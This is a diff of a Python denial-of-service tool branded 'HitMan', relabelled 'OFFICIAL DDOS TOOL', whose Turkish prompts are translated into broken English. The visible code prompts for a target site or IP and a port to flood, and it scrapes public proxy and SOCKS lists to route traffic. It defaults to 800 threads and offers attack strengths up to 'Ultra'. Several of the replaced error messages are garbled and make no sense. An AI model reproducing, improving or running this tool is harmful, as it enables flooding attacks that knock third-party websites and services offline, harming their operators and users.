@@ -12,7 +12,7 @@ from bs4 import BeautifulSoup
 try: 
 	from scapy.all import * 
 except: 
-	print ("TCP/UDP SUANLIK KULLANILMIYOR AMA HTTPS AKTIF./ TUM HAKLARI KULLANICAYA AITTIR") 
+	print ("OFFICIAL DDOS TOOL") 
 
 print('''
 
@@ -23,7 +23,7 @@ print('''
 ██╔══██║██║░░░██║░░░██║╚██╔╝██║██╔══██║██║╚████║
 ██║░░██║██║░░░██║░░░██║░╚═╝░██║██║░░██║██║░╚███║
 ╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
-HITMAN
+
 
                                   
 
@@ -471,10 +471,10 @@ def starturl():
 	global url2
 	global urlport
 
-	url = input("\n SITE LINKI / IPISI: ").strip()
+	url = input("Site link ").strip()
 
 	if url == "":
-		print ("LUTFEN IP/URL GIRIN.")
+		print (" IP/URL .")
 		starturl()
 
 	try:
@@ -530,21 +530,21 @@ def floodmode():
 def floodport():
 	global port
 	try:
-		port = int(input("FLOOD ATMAK ISTEDIIN PORTU GIR: "))
+		port = int(input("FLOOD attack: "))
 		portlist = range(65535) 
 		if port in portlist: 
 			pass 
 		else: 
-			print ("Hatali Tekrar Dene.")
+			print ("Done.")
 			floodport() 
 	except ValueError:
-		print ("Hatali Tekrar Dene.") 
+		print ("HitMan .") 
 		floodport() 
 	proxymode()
 
 def proxymode():
 	global choice2
-	choice2 = input("Proxy Veya Soket Modu Aktiflessinmi? evetse 'Y' Hayirsa 'H': ")
+	choice2 = input("Proxy or Socket Mode ? ProxyHitman 'Y' HitMan 'H': ")
 	if choice2 == "y":
 		choiceproxysocks()
 	else:
@@ -552,17 +552,17 @@ def proxymode():
 
 def choiceproxysocks():
 	global choice3
-	choice3 = input("0 Proxy Modu / 1 Soket Modu: ")
+	choice3 = input("0 Proxy Mode / 1 Socket Mode: ")
 	if choice3 == "0":
 		choicedownproxy()
 	elif choice3 == "1":
 		choicedownsocks()
 	else:
-		print ("HATALI TEKRAR DENE.")
+		print (" HitMan")
 		choiceproxysocks()
 
 def choicedownproxy():
-	choice4 = input("Proxy Listesini Guncellemek Istermisin? Evetse 'Y': ")
+	choice4 = input("Proxy? 'Y': ")
 	if choice4 == "y":
 		urlproxy = "http://free-proxy-list.net/"
 		proxyget(urlproxy)
@@ -570,7 +570,7 @@ def choicedownproxy():
 		proxylist()
 
 def choicedownsocks():
-	choice4 = input("Soket Listesini Guncellemek Istermisin? Evetse 'Y': ")
+	choice4 = input("Socket? 'Y': ")
 	if choice4 == "y":
 		urlproxy = "https://www.socks-proxy.net/"
 		proxyget(urlproxy)
@@ -604,7 +604,7 @@ def proxyget(urlproxy):
 
 def proxylist():
 	global proxies
-	out_file = str(input("Proxylerin Yerini Yaz Aktif Olani Kullanmak Icin 'ENTER' Bas (proxy.txt): "))
+	out_file = str(input("Proxy 'ENTER'  (proxy.txt): "))
 	if out_file == "":
 		out_file = "proxy.txt"
 	proxies = open(out_file).readlines()
@@ -613,7 +613,7 @@ def proxylist():
 def numthreads():
 	global threads
 	try:
-		threads = int(input("Kac thread Olsun ? Yazmak Istemessen 'ENTER' Bas (800): "))
+		threads = int(input("How many threads? press 'ENTER' for (800): "))
 	except ValueError:
 		threads = 800
 		print ("800 threads selected.\n")
@@ -622,14 +622,14 @@ def numthreads():
 def multiplication():
 	global multiple
 	try:
-		multiple = int(input("Saldiri Gucunu Ayarla [(1-5=normal)(50=Dengeli)(100=Ultra)]: "))
+		multiple = int(input("HitMan option [(1-5=normal)(50=Medioum )(100=Ultra)]: "))
 	except ValueError:
-		print("HATALI Tekrar Dene.\n")
+		print("Chosen")
 		multiplication()
 	begin()
 
 def begin():
-	choice6 = input("'ENTER' A BAS SALDIRI BASLASIN [RAT] : ")
+	choice6 = input("'ENTER' to activate HitMan : ")
 	if choice6 == "":
 		loop()
 	elif choice6 == "Enter": 
